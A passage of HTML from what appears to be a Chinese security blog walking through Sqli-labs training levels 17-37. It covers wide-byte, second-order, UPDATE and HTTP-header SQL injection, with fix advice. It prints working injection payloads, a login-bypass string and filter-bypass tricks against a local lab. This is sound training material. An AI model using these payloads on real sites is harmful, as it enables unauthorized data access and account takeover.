{ //preg_quote：保持字符串,使其不适用正则表达式的特殊语义
    $string = preg_replace(&apos;/&apos;. preg_quote(&apos;\\&apos;) .&apos;/&apos;, &quot;\\\\\\&quot;, $string);          //escape any backslash
    $string = preg_replace(&apos;/\&apos;/i&apos;, &apos;\\\&apos;&apos;, $string);                               //escape single quote with a backslash
    $string = preg_replace(&apos;/\&quot;/&apos;, &quot;\\\&quot;&quot;, $string);                                //escape double quote with a backslash


    return $string;
}
</code></pre><p>上述函数为过滤<code>&#39;</code>的函数,将’转为<code>\&#39;</code>,将<code>&quot;</code>转化为<code>\&quot;</code>,将<code>\</code>转化为<code>\\</code>,所以我们只能使用第一种方法,将<code>%5c</code>吃掉,使<code>&#39;</code>逃逸,造成注入。</p>
<p>若我们改变一下源代码,将过滤<code>\</code>的代码:<code>$string = preg_replace(&#39;/&#39;. preg_quote(&#39;\\&#39;) .&#39;/&#39;, &quot;\\\\\\&quot;, $string);</code>注释掉,用第二种方法过滤掉\,使’逃逸:</p>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-11-01.09.48.05-image.png" alt="2018-11-01.09.48.05-image.png"></p>
<p>如图可看到,<code>&#39;</code>成功逃逸。</p>
<h3 id="less-33"><a href="#less-33" class="headerlink" title="less-33"></a>less-33</h3><p>less-33的过滤代码:</p>
<pre><code>function check_addslashes($string)
{
    $string= addslashes($string);    
    return $string;
}
</code></pre><p>由代码可知,这里是用<code>addslashes()</code>函数来进行过滤的。<br><code>addslashes()</code> 返回预定字符之前添加\的字符串<br>预定义字符: <code>&#39;</code>,<code>&quot;</code>,<code>\</code>,处理方式与less-32一样,所以依旧用<code>%df</code>即可绕过。<br>注意:使用<code>addslashes()</code>函数,我们将<code>mysql_query()</code>设置<code>set character_set_client=binary</code>来设定客户端的字符集是二进制,就可防御此漏洞。</p>
<pre><code>#设置客户端的字符集为二进制,Mysql就以二进制来执行sql语句
Mysql_query(“SET character_set_connection=gbk,character_set_result=gbk,character_set_client=binary”,$conn);
</code></pre><h3 id="less-34"><a href="#less-34" class="headerlink" title="less-34"></a>less-34</h3><p>这一关是post型的注入漏洞,同样是将传输过来的<code>&#39;</code>进行了<code>\&#39;</code>处理,同样可用<code>%df</code>吃掉\,造成’逃逸<br>但是前几关都是基于get形式的注入,数据是以url形式提交的,因此数据会经过URLencode,那我们将<code>%df</code>先经过URLencode得到<code>�</code>,或者在burp/hackbar里用<code>%df</code>也是可以的。</p>
<p>首先在浏览器里尝试:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-11-01.11.02.48-image.png" alt="2018-11-01.11.02.48-image.png"></p>
<p>burp：<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-01.11.07.48-image.png" alt="2018-11-01.11.07.48-image.png"></p>
<p>hackbar也是可以的:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-01.11.06.05-image.png" alt="2018-11-01.11.06.05-image.png"></p>
<p>浏览器直接提交只能使用源字符,hackbar与burp里使用源字符与url编码过的字符都可以。</p>
<p>这里也说下万能密码:<br>提交:<code>�&#39; or 1=1#</code></p>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-01.11.14.50-image.png" alt="2018-11-01.11.14.50-image.png"></p>
<p>成功以Dumb的用户登陆。<br>我们看下源代码:</p>
<pre><code>@$sql=&quot;SELECT username, password FROM users WHERE username=&apos;$uname&apos; and password=&apos;$passwd&apos; LIMIT 0,1&quot;;
</code></pre><p>我们提交<code>�&#39; or 1=1#</code>,执行的sql语句为:<code>SELECT username, password FROM users WHERE username=&#39;�&#39; or 1=1#&#39; and password=&#39;$passwd&#39; LIMIT 0,1</code><br>实际执行的语句为<code>SELECT username, password FROM users WHERE username=&#39;�&#39; or 1=1</code>,无论数据库中有无username等于�的用户,在与1=1进行了or操作后,返回值都为1,<br>所以执行这条语句返回的结果是全部<code>username</code>与<code>password,mysql_fetch_array()</code>函数每次从结果集中取得一行作为关联数组,只去了一次,所以返回id为0的账户密码:<code>Dumb 0</code>。</p>
<h3 id="less-35"><a href="#less-35" class="headerlink" title="less-35"></a>less-35</h3><p>添加单引<code>&#39;</code>测试:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-01.11.37.30-image.png" alt="2018-11-01.11.37.30-image.png"></p>
<p>报错信息:<code>&#39;\&#39; LIMIT 0,1&#39;</code>,说明这里并不需要闭合符,直接联合注入即可</p>
<p><code>id=-1 union select 1,2,database()%23</code><br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-01.11.38.45-image.png" alt="2018-11-01.11.38.45-image.png"></p>
<h3 id="less-36"><a href="#less-36" class="headerlink" title="less-36"></a>less-36</h3><p>利用方式与<code>less-33</code>无异。</p>
<p>查看源代码:</p>
<pre><code>function check_quotes($string)
{
    $string= mysql_real_escape_string($string);    
    return $string;
}
</code></pre><p>查看代码得知是用<code>mysql_real_escape_string()</code>进行过滤的</p>
<p><code>mysql_real_escape_string()</code>函数转义 SQL 语句中使用的字符串中的特殊字符<br>下列字符受影响：</p>
<pre><code>\x00
\n
\r
\
&apos;
&quot;
\x1a
</code></pre><p>如果成功，则该函数返回被转义的字符串。如果失败,则返回false。<br>注意:在使用<code>mysql_real_escape_string()</code>时,需要将<code>mysql</code>设置为<code>gbk</code>:<code>Mysql_set_charset(&#39;gbk&#39;,&#39;$conn&#39;)</code></p>
<h3 id="less-37"><a href="#less-37" class="headerlink" title="less-37"></a>less-37</h3><p>利用方式与less-34无异<br>代码与less-34的区别是post内容用的是<code>mysql_real_escape_string()</code>函数进行处理的,而不是<code>addslashes()</code>函数,但是原理是一样的.利用方式也相同。</p>
<h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p>出现宽字节的原因是在PHP连接mysql时执行了如下设置:</p>
<pre><code>set character_set_client=gbk
</code></pre><p>这句代码是告诉mysql服务器,客户端传过来的数据是gbk编码的,然后mysql服务器对查询语句进行gbk编码导致反斜杠\被<code>%df</code>吃掉,但是一般网站都不这么设置,通常的设置方法是:<code>set names &#39;gbk&#39;</code>,但是实际上这行代码不过是比<code>set character_set_client</code>多干了两件事而已,set names ‘gbk’等同于如下代码:<br><code>set character_set_connection=&#39;gbk&#39; character_set_results=&#39;gbk&#39; character_set_client=gbk</code>。<br>代码意思是:mysql服务器接收客户端数据,认为他的编码是<code>character_set_client</code>,然后将其转化为<code>character_set_connection</code>的编码,然后进入表及字段,转化为字段对应编码,执行完sql语句返回的结果转成<code>character_set_results</code>编码,返回客户端。</p>
<h4 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法:"></a>修复方法:</h4><blockquote>
<p><strong>A</strong>.所有sql语句前指定一下连接的形式是二进制:set names ‘gbk’,character_set_client=binary或者直接(SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary)<br>    <strong>B</strong>.先调用mysql_set_charset(‘gbk’)设置连接所使用的字符集为gbk,然后使用mysql_real_escape_string()来过滤用户输入。<br>    <strong>C</strong>.使用PDO模式,在PHP5.3.6及以下版本,需要设置serAttribute(PDO::ATTR_EMULATE_PREPARES,false);来禁用prepare statements的仿真效果(本地模拟预处理),这个在之前复现TP框架的洞时有涉及:<br>    <a href="https://p0rz9.github.io/2018/09/19/ThinkPHP%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E6%B3%84%E9%9C%B2%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81+%E9%B8%A1%E8%82%8Bsql%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">ThinkPHP5.x设计缺陷泄露账户密码+鸡肋sql注入</a>         </p>
</blockquote>
<p>但是还存在一种特殊情况,就是<code>iconv()</code>的错误使用导致上面的方法前功尽弃,例如：很多cms使用<code>iconv(&#39;utf-8&#39;, &#39;gbk&#39;, $_GET[&#39;word&#39;]);</code>来转换编码,目的是避免乱码。但是在utf-8转向gbk或者在gbk转向utf-8时,会多处一个%5c将转义符(反斜杠)转义,造成后面的单引号逃逸,也会造成注入。</p>
<h4 id="CMS挖掘"><a href="#CMS挖掘" class="headerlink" title="CMS挖掘:"></a>CMS挖掘:</h4><p>挖掘宽字节注入的方法也比较简单,只要搜索如下几个关键字即可:</p>
<pre><code>set names
character_set_client=gbk
mysql_set_charset(&apos;gbk&apos;)
iconv(
</code></pre>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/30/Sqli-labs Less23-28/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/10/30/Sqli-labs Less23-28/" itemprop="url">Sqli-labs Less23-28</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-30T08:15:42+08:00">
                2018-10-30
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h3 id="less-23"><a href="#less-23" class="headerlink" title="less-23"></a>less-23</h3><pre><code>http://127.0.0.1:86/less-23/index.php?id=1&apos;  报错
http://127.0.0.1:86/less-23/index.php?id=1&apos;%23    报错
http://127.0.0.1:86/less-23/index.php?id=1&apos;--+ 报错
http://127.0.0.1:86/less-23/index.php?id=1&apos;&apos; 正确
</code></pre><p>猜想是后台过滤了这2种注释字符,但是我们可以用<code>&#39;1&#39;=&#39;1</code>闭合后面的<code>&#39;</code>。</p>
<p>这里可利用联合注入,报错注入,延时注入,我们以联合注入为例:</p>
<pre><code>http://127.0.0.1:86/less-23/index.php?id=-1&apos; union select 1,2,3 and &apos;1&apos;=&apos;1        
</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-30.09.16.43-image.png" alt="2018-10-30.09.16.43-image.png"></p>
<pre><code>http://127.0.0.1:86/less-23/index.php?id=-1&apos; union select 1,database(),3 and &apos;1&apos;=&apos;1
</code></pre><p>然后将<code>database()</code>处更换为其他查询语句即可。<br>less-23过滤id的代码:</p>
<pre><code>$reg = &quot;/#/&quot;;
$reg1 = &quot;/--/&quot;;
$replace = &quot;&quot;;
$id = preg_replace($reg, $replace, $id);
$id = preg_replace($reg1, $replace, $id);
</code></pre><h3 id="less-24"><a href="#less-24" class="headerlink" title="less-24"></a>less-24</h3><p>这一关是关于二次注入的,二次注入也称为存储型的注入,就是将可能导致sql注入的字符先存储到数据库中,当再次调用这个恶意构造的字符时,就会触发sql注入。</p>
<p>这个例子大致过程:注册一个含有恶意字符(构造sql语句)的用户名(<code>admin&#39;#</code>)—-&gt;存储到数据库中——&gt;修改密码时,调用恶意字符导致修改了用户admin的密码<br>n注册账户admin’#  密码:123456<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-30.09.55.00-image.png" alt="2018-10-30.09.55.00-image.png"></p>
<p>查看数据库:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-30.09.58.25-image.png" alt="2018-10-30.09.58.25-image.png"></p>
<p>登陆后跳转到更改密码的页面,我们更改密码为test:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-30.09.59.01-image.png" alt="2018-10-30.09.59.01-image.png"></p>
<p>查看数据库:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-30.09.59.57-image.png" alt="2018-10-30.09.59.57-image.png"></p>
<p>我们发现我们刚才注册的账号<code>admin&#39;#</code>的密码并未改变,却改变了admin的密码<br>查看源码:</p>
<pre><code>$curr_pass= mysql_real_escape_string($_POST[&apos;current_password&apos;]);
$pass= mysql_real_escape_string($_POST[&apos;password&apos;]);
$re_pass= mysql_real_escape_string($_POST[&apos;re_password&apos;]);

if($pass==$re_pass)
{    
    $sql = &quot;UPDATE users SET PASSWORD=&apos;$pass&apos; where username=&apos;$username&apos; and password=&apos;$curr_pass&apos; &quot;;
</code></pre><p>看代码我们就能理解了,刚才咱们提交修改<code>admin&#39;#</code>后,执行的sql语句是:</p>
<pre><code>UPDATE users SET PASSWORD=&apos;test&apos; where username=&apos;admin&apos;#&apos; and password=&apos;123456&apos;
</code></pre><p> 因为#注释掉了后面的内容,所以只执行了前面的语句,将admin的密码修改为test</p>
<h3 id="less-25"><a href="#less-25" class="headerlink" title="less-25"></a>less-25</h3><p> 访问less-25的地址:<br> <img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-30.10.53.14-image.png" alt="2018-10-30.10.53.14-image.png"></p>
<p> 大概意思就是:and or被过滤,然后下面写出了过滤后的字符串。面对关键字被过滤的情况,我们可利用:</p>
<pre><code>1.大小写绕过    AND AnD ANd And aNd aND anD Or oR OR等  
2.双写绕过        anandd oorr
3.编码绕过        hex urlencode
4.特殊字符        an%00d o%00r
5.利用符号绕过   and=&amp;&amp; or=||
6.内联注释绕过  /*!and*/
</code></pre><p>大小写不可以</p>
<p>双写可以绕过:</p>
<pre><code>http://127.0.0.1:86/less-25/index.php?id=1&apos; anandd &apos;1&apos;=&apos;1    
</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-30.10.54.56-image.png" alt="2018-10-30.10.54.56-image.png"><br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-30.12.09.50-image.png" alt="2018-10-30.12.09.50-image.png"></p>
<p>编码绕过:(绕不过)</p>
<pre><code>%25%36%31%25%36%45%25%36%34
http://127.0.0.1:86/less-25/index.php?id=1&apos; %25%36%31%25%36%45%25%36%34 &apos;1&apos;=&apos;1    
</code></pre><p>插入%00绕过</p>
<pre><code>http://127.0.0.1:86/less-25/index.php?id=1&apos; an%00d &apos;1&apos;=&apos;1
</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-30.12.03.45-image.png" alt="2018-10-30.12.03.45-image.png"></p>
<p>注:在数据库中 插入<code>/**/</code>也可绕过,但是在实际利用不可以  原因不详。。。。<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-30.12.13.01-image.png" alt="2018-10-30.12.13.01-image.png"><br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-30.12.14.22-image.png" alt="2018-10-30.12.14.22-image.png"></p>
<p>利用符号绕过:（&amp;&amp;会被url当成参数分隔符 <code>||</code>可利用）<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-30.12.06.47-image.png" alt="2018-10-30.12.06.47-image.png"></p>
<p>我们这里使用双写绕过方法进行演示,注入的方法可以为联合,报错与延时,这里以联合注入为例:</p>
<pre><code>#显示报错位:
http://127.0.0.1:86/less-25/index.php?id=-1&apos; union select 1,2,3 anandd &apos;1&apos;=&apos;1 

#得到数据库名
http://127.0.0.1:86/less-25/index.php?id=-1&apos; union select 1,database(),3 anandd &apos;1&apos;=&apos;1 
</code></pre><p>接下来注入即可。</p>
<p>less-25过滤<code>id</code>的代码:</p>
<pre><code>function blacklist($id)
{
    $id= preg_replace(&apos;/or/i&apos;,&quot;&quot;, $id);            //strip out OR (non case sensitive)
    $id= preg_replace(&apos;/AND/i&apos;,&quot;&quot;, $id);        //Strip out AND (non case sensitive)

    return $id;
}
</code></pre><h3 id="less-25a"><a href="#less-25a" class="headerlink" title="less-25a"></a>less-25a</h3><p>与less-25类似,只是sql语句是直接拼接<code>$id</code>且关闭了报错,所以把闭合符号<code>&#39;</code>去掉用联合或者延时注入即可。</p>
<hr>
<h3 id="less-26"><a href="#less-26" class="headerlink" title="less-26"></a>less-26</h3><p>过滤函数:</p>
<pre><code>function blacklist($id)
{
    $id= preg_replace(&apos;/or/i&apos;,&quot;&quot;, $id);            //strip out OR (non case sensitive)
    $id= preg_replace(&apos;/and/i&apos;,&quot;&quot;, $id);        //Strip out AND (non case sensitive)
    $id= preg_replace(&apos;/[\/\*]/&apos;,&quot;&quot;, $id);        //strip out /*
    $id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);        //Strip out --
    $id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);            //Strip out #
    $id= preg_replace(&apos;/[\s]/&apos;,&quot;&quot;, $id);        //Strip out spaces
    $id= preg_replace(&apos;/[\/\\\\]/&apos;,&quot;&quot;, $id);        //Strip out slashes
    return $id;
}
</code></pre><p>过滤掉了<code>or and /* -- # 所有空白字符 \</code>等字符<br>对于or与and被过滤的处理方法,见less-25,对于注释符的过滤,见less-23,对于空格,可用下方的字符代替:</p>
<pre><code>/**/   注释符   被过滤
%09    TAB键（水平）
%0a    新建一行
%0b    TAB键（垂直）
%0c    新的一页
%0d    return功能
%a0    空格
</code></pre><p>可在<code>linux</code>下尝试是否能成功,这里没搭建,先占个坑</p>
<h3 id="less-26a"><a href="#less-26a" class="headerlink" title="less-26a"></a>less-26a</h3><p>相比于less-26,闭合符换为了<code>&#39;)</code>且关闭了报错,使用联合或延时注入即可。</p>
<h3 id="less-27"><a href="#less-27" class="headerlink" title="less-27"></a>less-27</h3><p>查看源代码：</p>
<pre><code>function blacklist($id)
{
$id= preg_replace(&apos;/[\/\*]/&apos;,&quot;&quot;, $id);        //strip out /*
$id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);        //Strip out --.
$id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);            //Strip out #.
$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);        //Strip out spaces.
$id= preg_replace(&apos;/select/m&apos;,&quot;&quot;, $id);        //Strip out spaces.
$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);        //Strip out spaces.
$id= preg_replace(&apos;/union/s&apos;,&quot;&quot;, $id);        //Strip out union
$id= preg_replace(&apos;/select/s&apos;,&quot;&quot;, $id);        //Strip out select
$id= preg_replace(&apos;/UNION/s&apos;,&quot;&quot;, $id);        //Strip out UNION
$id= preg_replace(&apos;/SELECT/s&apos;,&quot;&quot;, $id);        //Strip out SELECT
$id= preg_replace(&apos;/Union/s&apos;,&quot;&quot;, $id);        //Strip out Union
$id= preg_replace(&apos;/Select/s&apos;,&quot;&quot;, $id);        //Strip out Select
return $id;
}
</code></pre><p>发现在前面的基础上过滤了<code>union select</code>等敏感字符,使用双写或大小写混淆即可绕过。</p>
<h3 id="less-27a"><a href="#less-27a" class="headerlink" title="less-27a"></a>less-27a</h3><p>相比于less-27,直接拼接<code>$id</code>,所以不需要闭合符去闭合且关闭了报错,用联合或延时注入即可。</p>
<h3 id="less-28"><a href="#less-28" class="headerlink" title="less-28"></a>less-28</h3><p>对比less-27,闭合符号由<code>&#39;</code>变为<code>&#39;）</code>且关闭报错与过滤条件少了select,使用联合或延时注入即可</p>
<h3 id="less-28a"><a href="#less-28a" class="headerlink" title="less-28a"></a>less-28a</h3><p>对比less-28,只是少了几个过滤条件,使用联合或延时注入即可</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/29/Sqli-labs Less17-22/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/10/29/Sqli-labs Less17-22/" itemprop="url">Sqli-labs Less17-22</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-29T08:15:41+08:00">
                2018-10-29
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>在做<code>less-17</code>之前,需要先了解一些MYSQL基础增删改查的命令:<a href="https://p0rz9.github.io/2018/10/12/mysql%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/" target="_blank" rel="noopener">基础知识 | MYSQL基础命令</a></p>
<h2 id="less-17-update注入"><a href="#less-17-update注入" class="headerlink" title="less-17 update注入"></a>less-17 update注入</h2><p>经测试在 admin字段中无报错信息<br>我们测试password字段:<br>uname=admin&amp;passwd=admin’&amp;submit=Submit<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-29.11.59.10-image.png" alt="2018-10-29.11.59.10-image.png"></p>
<p>查看报错即可知道这里用<code>&#39;</code>闭合即可,且这里显示出sql错误,所以可用报错注入或延时注入,下面介绍下报错注入:</p>
<pre><code>uname=admin&amp;passwd=admin&apos; and updatexml(1,concat(0x7e,(select database()),0x7e),1)%23&amp;submit=Submit  #得到数据库名
</code></pre><p>然后将select database()换为其他查询语句即可(可参考less-5的查询语句)：<br><a href="https://p0rz9.github.io/2018/10/23/Sqli-labs_Blind_injection_Less5-6/" target="_blank" rel="noopener">Sqli-labs_Blind_injection_Less5-6/</a></p>
<p>less-17的sql语句为:</p>
<pre><code>function check_input($value)
{
if(!empty($value))
    {
    // truncation (see comments)
    $value = substr($value,0,15);
    }

    // Stripslashes if magic quotes enabled
    if (get_magic_quotes_gpc())
        {
        $value = stripslashes($value);
        }

    // Quote if not a number
    if (!ctype_digit($value))
        {
        $value = &quot;&apos;&quot; . mysql_real_escape_string($value) . &quot;&apos;&quot;;
        }

else
    {
    $value = intval($value);
    }
return $value;
}
......
$update=&quot;UPDATE users SET password = &apos;$passwd&apos; WHERE username=&apos;$row1&apos;&quot;;
</code></pre><p>查看源代码就可理解这里的<code>uname</code>字段为什么不能注入了,因为经过check_input安全函数过滤：</p>
<pre><code>★addslashes() #预定字符之前添加反斜杠并返回
注:PHP会默认(gpc为on状态)对所有的GET POST COOKIE数据自动运行addslashes,所以不应该对已转义过的字符使用addslashes()操作,会造成双层转义。
遇到这种情况,一般使用get_magic_quotes_gpc()进行检测。

★stripslashes() #删除由addslashes()添加的反斜杠

★mysql_real_escape_string() #转义sql语句中使用的特殊字符`
</code></pre><p>经过这几个函数处理,所以<code>uname</code>这个字段不能注入了。<br>那这里注入的语句使用的是update操作  我们在挖掘CMS的漏洞时,也可以将查询语句拼接到后面,然后再找一处查询该数据表内容的地方形成注入(update insert注入)</p>
<hr>
<p>在接下来的几关都属于HTTP头注入,我们需要先了解一下一些http基础:</p>
<pre><code>Accept： 浏览器能够处理的内容类型
Accept-Charset： 浏览器能够显示的字符集
Accept-Encoding：浏览器能够处理的压缩编码。
Accept-Language： 浏览器当前设置的语言。
Connection：浏览器与服务器之间连接的类型
Cookie：当前页面设置的任何Cookie
Host：发出请求的页面所在的域。
Referer：发出请求的页面的URI。
User-Agent：浏览器的用户代理字符串
Server: WEB 服务器表明自己是什么软件及版本等信息。例如：Server：Apache/2.0.61 (Unix)
</code></pre><h2 id="less-18-UA头注入"><a href="#less-18-UA头注入" class="headerlink" title="less-18 UA头注入"></a>less-18 UA头注入</h2><p>输入正确的账号密码:admin 0<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-29.15.31.25-image.png" alt="2018-10-29.15.31.25-image.png"></p>
<p>看见这里会显示ip与UA头,我们尝试注入:</p>
<pre><code>User-Agent: aaaaa&apos; and updatexml(1,concat(0x7e,(select user()),0x7e),1),&apos;
</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-29.15.22.23-image.png" alt="2018-10-29.15.22.23-image.png"></p>
<p>ip伪造主要有几个参数:<br><code>X-FORWARDED-FOR</code> 是代理服务器通过<code>HTTP Headers</code>提供的客户端IP.代理服务器可以伪造任何IP.<br><code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code> 就是跟你服务器直接连接的IP. 不可伪造<br><code>CLIENT_IP</code> 可伪造</p>
<p>这里尝试了几个,ip不可伪造注入</p>
<p>less-18的sql语句为:</p>
<pre><code>$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&apos;$uagent&apos;, &apos;$IP&apos;, $uname)&quot;;
</code></pre><h2 id="less-19-REFERER注入"><a href="#less-19-REFERER注入" class="headerlink" title="less-19 REFERER注入"></a>less-19 REFERER注入</h2><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-29.15.46.12-image.png" alt="2018-10-29.15.46.12-image.png"><br>放入burp的reperter模块测试:<br>与less-18的payload一样,只不过是从UA头换到了referer处：</p>
<pre><code>Referer: &apos; and updatexml(1,concat(0x7e,(select user()),0x7e),1),&apos;
</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-29.16.32.48-image.png" alt="2018-10-29.16.32.48-image.png"></p>
<p>然后将<code>select user()</code>处更换为其他查询语句就ok了</p>
<p>less-19的sql语句为:</p>
<pre><code>$uname = check_input($_POST[&apos;uname&apos;]);
$passwd = check_input($_POST[&apos;passwd&apos;]);
......
$insert=&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&apos;$uagent&apos;, &apos;$IP&apos;)&quot;;
</code></pre><h2 id="less-20-Cookie注入"><a href="#less-20-Cookie注入" class="headerlink" title="less-20 Cookie注入"></a>less-20 Cookie注入</h2><p>我们查看代码:</p>
<pre><code>&lt;?php
if(!isset($_COOKIE[&apos;uname&apos;]))
    {
    ...
        $sql=&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;
        $result1 = mysql_query($sql);
        $row1 = mysql_fetch_array($result1);
        $cookee = $row1[&apos;username&apos;];
            if($row1)
                {
                echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&apos;;
                setcookie(&apos;uname&apos;, $cookee, time()+3600);    
                ...
}
else
{
    if(!isset($_POST[&apos;submit&apos;]))
        {
            $cookee = $_COOKIE[&apos;uname&apos;];
            ...
            $sql=&quot;SELECT * FROM users WHERE username=&apos;$cookee&apos; LIMIT 0,1&quot;;
            ...
        }    
    else
        ...
}
?&gt;
</code></pre><p>从源代码可看出,我在第一次登陆时,我们的cookie从username取值,当再次刷新后,会从cookie字段中读取username的值然后进行查询.</p>
<p>首先填写正确账号密码:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-29.17.36.27-image.png" alt="2018-10-29.17.36.27-image.png"><br>提交之后:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-29.17.36.55-image.png" alt="2018-10-29.17.36.55-image.png"></p>
<p>然后我们刷新时抓包:</p>
<pre><code>GET /less-20/index.php HTTP/1.1
Host: 127.0.0.1:86
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://127.0.0.1:86/less-20/index.php
Cookie: uname=admin
Connection: close
Cache-Control: max-age=0
</code></pre><p>修改cookie为：</p>
<pre><code>Cookie: uname=admin&apos; and updatexml(1,concat(0x7e,(select user()),0x7e),1)%23
</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-29.17.40.44-image.png" alt="2018-10-29.17.40.44-image.png"></p>
<p>之后将<code>select user()</code>改为其他查询语句即可。</p>
<h2 id="less-21-cookie-base64-注入"><a href="#less-21-cookie-base64-注入" class="headerlink" title="less-21 cookie_base64 注入"></a>less-21 cookie_base64 注入</h2><p>与less-20同理,只是将payload的闭合符号<code>&#39;</code>换为<code>&#39;)</code>,再用base64加密一下即可:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-29.17.50.13-image.png" alt="2018-10-29.17.50.13-image.png"></p>
<h2 id="less-22"><a href="#less-22" class="headerlink" title="less-22"></a>less-22</h2><p>将less-21的payload的闭合符号<code>&#39;)</code>换为<code>&quot;</code>,再用base64加密一下即可:</p>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-29.18.01.40-image.png" alt="2018-10-29.18.01.40-image.png"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
